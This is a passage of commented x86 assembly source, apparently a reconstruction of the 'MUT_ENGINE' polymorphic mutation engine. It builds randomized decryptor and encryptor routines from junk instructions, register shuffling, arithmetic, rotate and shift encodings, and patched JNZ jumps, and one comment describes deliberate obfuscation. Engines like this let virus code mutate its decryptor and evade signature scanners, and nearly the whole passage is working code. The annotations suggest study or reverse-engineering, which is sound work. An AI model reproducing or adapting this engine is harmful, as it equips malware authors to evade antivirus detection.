        call    emit_ops

        pop     bx
        pop     cx
        pop     ax

        ; ax = op - 2; bx = index into ops_args, cx = ops_args
        cmp     al, 0Ch         ; 0xE? jnz op
        jnz     @@op_not_jnz

        ; handle jnz {{{
        or      dl, dl
        jnz     _ret_0
        cmp     dh, (ptr_reg - ptr_reg)[si]
        jz      _ret_0

        push    ax
        push    cx
        push    bx

        push    dx
        call    emit_mov_data
        pop     dx

        mov     ax, word ptr (data_reg - ptr_reg)[si] ; picks up last_op too
        cmp     dh, al          ; dh == data_reg?
        jnz     @@encode_test
        or      ah, ah          ; did emit_mov_data() modify last_op?
        jz      @@encode_jnz

@@encode_test:
        mov     bl, 85h         ; TEST r/m,reg
        call    bl_op_reg_mrm   ; ... r/m is reg,imm

@@encode_jnz:
        pop     bx
        mov     al, 75h         ; JNZ
        stosb
        inc     bp
        jz      @@dont_record
        cmp     di, offset encrypt_stage
        jb      @@in_decrypt

        ; encode INT 3 at the JNZ.  deliberate obfuscation, mov is the
        ; same length.
        add     byte ptr [di-1], 57h

@@in_decrypt:   mov     ax, di
        xchg    ax, word ptr (jnz_patch_dec - ops)[bx]
        mov     word ptr jnz_patch_enc[bx], ax

@@dont_record:  dec     bp
        inc     di
        mov     dx, di
        jmp     @@walk_right
        ; }}}

@@op_not_jnz:
        push    ax
        push    cx

        ; left arg imm value?
        or      dl, dl
        jnz     @@walk_right

        ; are we working on the data register?
        cmp     dh, (data_reg - ptr_reg)[si]
        jnz     @@walk_right

        ; have we cleared the top bit of last_op_flag yet?
        mov     al, (last_op_flag - ptr_reg)[si]
        or      al, al
        js      @@pick_reg

        ; if it's cleared, we've loaded the target and are now doing register ops

        ; op with operand target?  flip order
        and     al, 7
        jz      @@change_direction

        cmp     al, (ptr_reg - ptr_reg)[si]
        jz      @@pick_reg
        cmp     al, 3
        jb      @@pick_reg      ; pick_reg if ax/cx/dx

        ; if the target register is ax, or an unused pointer register,
        ; reverse the operand order of the opcode we emitted
        ;
        ; al == 0 || (al != ptr_reg && al >= 3) 
@@change_direction: ; {{{
; 03, 0b, 23, 2b, 33
        xor     byte ptr [di-2], 2
        test    byte ptr (last_op_flag - ptr_reg)[si], 40h
        jz      @@mark_reg_used

        push    ax              ; encode neg reg
        or      al, 11011000b
        mov     ah, al
        mov     al, 0F7h
        stosw
        pop     ax
        jmp     @@mark_reg_used
        ; }}}

        ; pick reg {{{
        ; we'll try to pick a register here.  if we fail after 8
        ; attempts, we instead generate a push/.../pop.
@@pick_reg:     call    RND_GET
                mov     cx, 8

@@pick_loop:
                push    ax
                mov     al, dh
                or      al, 50h         ; push
                stosb
                pop     ax
                mov     bl, 80h
                jcxz    @@push_instead
                dec     di              ; rewind
                dec     cx

                inc     ax
                and     al, 7
                cbw
                mov     bx, ax
                mov     ah, (reg_set_enc - ptr_reg)[bx+si]
                or      ah, ah
                jz      @@pick_loop

                dec     bx
                jnz     @@double_ref
                pop     bx
                push    bx
                xor     bh, bh
                mov     ah, (ops - ops)[bx]
                or      ah, ah
                js      @@pick_loop

@@double_ref:   call    emit_mov

; }}}

@@mark_reg_used:
        xchg    ax, bx
        inc     byte ptr (reg_set_enc - ptr_reg)[bx+si]

@@push_instead:
        mov     dh, bl
        ; }}}

@@walk_right: ; {{{
        pop     bx
        push    dx
        call    emit_ops
        call    emit_mov_data   ; load reg al with val bp
        pop     dx
        pop     ax

        ; done store
        mov     byte ptr (last_op_flag - ptr_reg)[si], 80h

        ; did we generate jnz?
        cmp     al, 0Ch
        jnz     @@continue

        ; conclude jnz {{{
        mov     bx, dx          ; get dx from before we walked right
        mov     dx, di
        sub     dx, bx
        mov     [bx-1], dl
        jmp     @@done
        ; }}}

@@continue:
        mov     ch, ah          ; ch=0
        push    ax              ; save op-2

        or      dl, dl
        jnz     @@emit_op

        cmp     dh, 80h
        jnz     @@didnt_push

        ; couldn't find a reg and needed to push.  generate a pop into cx/dx {{{
        sub     al, 5           ; op-7
        cmp     al, 4           ; [0,3] => [7,10] (ro_/sh_)
        mov     al, 1           ; REG_CX
        jb      @@not_shift
        inc     ax              ; REG_DX
@@not_shift:
        mov     dh, al
        or      al, 58h         ; pop opcode
        stosb
        jmp     @@emit_op
        ; }}}

@@didnt_push:
        or      dh, dh
        js      @@emit_op

        cmp     dh, (ptr_reg - ptr_reg)[si]
        jz      @@emit_op

        ; free the register
        mov     bl, dh
        xor     bh, bh
        dec     byte ptr (reg_set_enc - ptr_reg)[bx+si]
        ; }}}

@@emit_op: ; {{{
        pop     ax

        ; al is the op, less 2 from the dec+dec
        mov     bl, 0Bh         ; OR reg,r/m
        sub     al, 9           ; 0xb 11 == or
        jz      @@got_op

        ; less 11
        mov     bl, 23h         ; AND reg,r/m
        dec     ax              ; 0xc 12 == and
        jz      @@got_op

        ; less 12
        add     al, 6
        cbw
        jns     @@check_mul

        ; xor/add/sub/and/or generation {{{

        ; less 6
        mov     bl, 33h         ; 5 == xor: XOR reg,r/m
        inc     ax
        jz      @@got_op
        mov     bl, 03h         ; 4 == add: ADD reg,r/m
        jp      @@got_op
        mov     bl, 2Bh         ; 3 == sub: SUB reg,r/m
@@got_op:
        mov     al, (data_reg - ptr_reg)[si]
        or      dl, dl
        jnz     @@try_optimization
        ; {{{

        and     dh, 10000111b   ; -> last_op_flag
        cmp     bl, 2Bh         ; sub?
        jnz     @@set_flag
        or      dh, 01000000b   ; flag we're subbing
@@set_flag:
        mov     (last_op_flag - ptr_reg)[si], dh

@@do_op_mrm:
        call    encode_mrm
        jnc     @@j_save_op_done ; break, outta here

        or      al, al
        jz      @@try_optimization
        inc     bp
        ; }}}
@@try_optimization:
        ; {{{
        ; xor reg,-1 becomes not
        ; if arg [-2,2]: sub/adds will become dec/incs
        xor     bl, 00000110b
        push    dx
        inc     dx
        inc     dx
        cmp     dx, 5           ; [-2,2]?
        pop     dx
        jnb     @@emit_81_ops
        or      ax, ax
        js      @@opt_inc_dec

        ; xor x,-1 => not x
        cmp     bl, 00110101b   ; xor?
        jnz     @@emit_81_ops
        inc     dx
        jnz     @@emit_81_ops_d ; restore dx
        mov     dh, al
        mov     al, 2           ; 2<<3 is NOT from the 0xf7 series
@@emit_f7_op:
        mov     bl, 0F7h
        mov     ch, bl
        jmp     @@do_op_mrm

@@opt_inc_dec:
        or      dx, dx
        jns     @@opt_inc       ; [-2,-1]?
        neg     dx
        xor     bl, 00101000b   ; toggle add/sub

@@opt_inc:                      ; inc reg
        or      al, 40h
        cmp     bl, 00000101b   ; was sub?
        jz      @@opt_not_dec
        or      al, 8           ; dec reg
@@opt_not_dec:                               ; +/- 1
        stosb
        dec     dx
        jz      @@j_save_op_done
        stosb                   ; +/- 2
        jmp     @@j_save_op_done
        ; }}}

        ; }}}

        ; mul/imul generation {{{
@@check_mul:
        mov     cl, 4           ; 4<<3 is MUL from the 0xf7 series
        jnz     @@check_imul
        ; {{{

@@emit_mov_dx:
        or      dl, dl                  ; imm arg?
        jz      @@no_mul_arg
        mov     ax, 02BAh               ; mov dx,imm16
        stosb
        xchg    ax, dx
        stosw
@@no_mul_arg:
        xchg    ax, cx
        jmp     @@emit_f7_op

@@emit_81_ops_d:                        ; restore dx
        dec     dx

@@emit_81_ops:                          ; add/or/adc/sbb/and/sub/xor/cmp
                or      al, al
                jz      @@not_imm
                and     bl, 00111000b   ; mask off op
                or      al, 11000000b   ; set mod to reg
                or      bl, al

                ; check if dl sign extended is equal to dx (nice!)
                mov     al, dl
                cbw
                xor     ax, dx
                mov     al, 81h
                jnz     @@do_imm16

                mov     al, 83h
                stc                     ; flag to rewind di

@@do_imm16:     stosb
@@not_imm:      xchg    ax, bx
                stosb
                xchg    ax, dx
                stosw

                jnc     @@j_save_op_done
                dec     di              ; rewind, imm8 op was done

        ; }}}
@@j_save_op_done:
        jmp     @@save_op_done

@@check_imul:
        ; al is off by 6

        inc     cx              ; 5<<3 is IMUL
        cmp     al, 7           ; 13 == imul
        jz      @@emit_mov_dx
        ; }}}

        ; rotate and shift generation {{{
        inc     ax
        ; al is off by 5
        cmp     al, 4
        pushf
        jae     @@not_rotate     ; >= 9? (is it shl/shr)

        sub     al, 2           ; al is off by 7

@@not_rotate:

        ; al = rotates [0,1], shifts [4,5]
        ;
        ; these are the now correct ranges for the instruction's octal digit
        ; indicator within the MRM of the [CD][0-3]-series ops

        or      dl, dl          ; reg arg?
        jnz     @@shifts_with_imm

; rotates and shifts with arg0:reg, arg1:cl=reg {{{

        ; al=(0,1,4,5)
        ; dl=0, dh=reg

        ; emit "mov cl,bl" if dh is 3 (REG_BX)
        push    ax
        mov     al, 1           ; cx/cl
        mov     bl, 8Ah         ; mov reg8,reg8
        mov     ch, bl
        cmp     dh, 3
        jz      @@do_reg8
        inc     bx              ; mov reg16,reg16
@@do_reg8:
        call    emit_op_mrm

        pop     ax
        popf
        push    ax
        jb      @@emit_d3       ; carry set if it's a rotate

        ; got a shift, check if we need to mask.
        ;
        ; generated if we're creating the decryptor while running on 8086/286+
        ; and "run on different cpu" was specified in the call to MUT_ENGINE.
        ;
        ; not generated if we're on a 286+ creating the enc.
        ;
        ; not generated if we're on a 286+ and "run on different cpu" was
        ; _not_ specified.

        mov     ax, 1F80h
        test    (is_8086 - ptr_reg)[si], ah 
        jz      @@emit_d3

        stosb                   ; and cl,1Fh
        mov     al, 0E1h        ; ""
        stosw                   ; ""

@@emit_d3:
        pop     ax
        mov     bl, 0D3h        ; rotates+shifts r/m16,cl
        mov     dl, 1           ; [^a] flag cl arg

@@emit_rosh_data:
        mov     dh, (data_reg - ptr_reg)[si]
        call    bl_op_reg_mrm   ; bl=op, al&7=reg1/op, dh=reg2
        xchg    ax, dx

        cmp     bl, 0C1h        ; RO_/SH_ reg,imm8
        jz      @@emit_rosh_imm8

        shr     al, 1           ; [^a]
        jc      @@save_op_done

        ; otherwise store the r/m, then the imm8 arg
        xchg    ax, bx
        stosb
        xchg    ax, dx

@@emit_rosh_imm8:
        stosb

@@save_op_done:
        mov     (last_op - ptr_reg)[si], ch

@@done:
        mov     dh, (data_reg - ptr_reg)[si]
        xor     dl, dl
        retn

; }}}
@@shifts_with_imm:
        mov     bl, 0C1h        ; rotates and shifts imm8
        popf                    ; >= 9?
        jae     @@check_zero

        mov     ch, bl          ; "last op"

        ; optimize rotates.  if the operand will be >= 8, complement the
        ; operand and change the op's direction.
        test    dl, 8
        jz      @@check_zero
        neg     dl
        xor     al, 1           ; rol<>ror, shr<>shl

@@check_zero:
        and     dl, 0Fh         ; clamp the rot/sh amount
        jz      @@done          ; 0 => nop

        cmp     dl, 1
        jz      @@do_op1

        ; are we on 286+?
        cmp     ah, (is_8086 - ptr_reg)[si]
        jz      @@emit_rosh_data

@@do_op1:
        mov     bl, 0D1h        ; rotates/shifts r/m16
        cmp     dl, 3           ; 1..2?
        jb      @@emit_rosh_data

        push    ax
        mov     al, 0B1h        ; mov cl,imm8
        mov     ah, dl
        stosw
        jmp     @@emit_d3       ; rot/shifts with cl argument
        ; }}}
        ; }}}

emit_ops endp

emit_mov_data   proc near
                mov     al, (data_reg - ptr_reg)[si]
emit_mov:                               ; emit a mov for al=reg, dx=val (dl=0 is a reg move)
                cbw
                push    ax
                cmp     di, offset encrypt_stage
                jnb     @@in_encrypt
                mov     bx, ax
                mov     (reg_set_dec - ptr_reg)[bx+si], bh
@@in_encrypt:   or      dl, dl
                jnz     @@do_mov_imm16
                mov     bl, 8Bh
                call    encode_mrm_dh_s ; skip op if dh is signed
                jnb     @@done
@@do_mov_imm16:
                or      al, 0B8h
                stosb
                xchg    ax, dx
                stosw

@@done:         pop     ax
                retn
emit_mov_data   endp

CODE_TOP:
                ends

scratch         segment
work_start:
ops             db 21h dup (?)
ops_args        db 42h dup (?)

jnz_patch_dec   db 42h dup (?)
jnz_patch_hits  db 42h dup (?)          ; for every location in jnz_patch_enc we record fallthroughs
jnz_patch_enc   db 42h dup (?)          ; has the location of the jnz in encrypt_stage

op_idx          db ?
op_free_idx     db ?
op_next_idx     db ?
op_end_idx      db ?
                db ?                    ; unused byte so we can address ops_end_idx as a word

junk_len_mask   db ?
is_8086         db ?                    ; on 8086: 32,31.  on 286+: 0,255
op_off_patch    dw ?

arg_code_entry  dw ?
arg_flags       dw ?
arg_size_neg    dw ?
arg_exec_off    dw ?
arg_start_off   dw ?

; byte map per reg: is this register value needed?
; used when creating the decr due to junk being generated (junk isn't
; created for the staging encr)
reg_set_dec     db 8 dup (?)            ; 8 bytes, gets initialised to -1
; byte per reg: is this register used?
; dx is marked as used initially
reg_set_enc     db 8 dup (?)

ptr_reg         db ?
data_reg        db ?

last_op         db ?                    ; 0 on single ref routines?
last_op_flag    db ?                    ; FF uninit; 80 was imm; 40 sub (need neg); 0 mul; else reg in imm,imm
patch_dummy     dw ?                    ; this gets the patch on single-ref routines

                ; reserved for push generation (or just a single PUSHA when not (is_8086&&run_on_different_cpu))
decrypt_pushes  db 7 dup(?)
decrypt_stage   db MAX_ADD dup (?)
encrypt_stage   db MAX_ADD dup (?)      ; gets called twice, first for the junk and then again for the loop

work_top        equ $                   ; used to hold encrypted data

                ends

                end

; vim:set filetype=tasm fdm=marker et comments+=:\;:
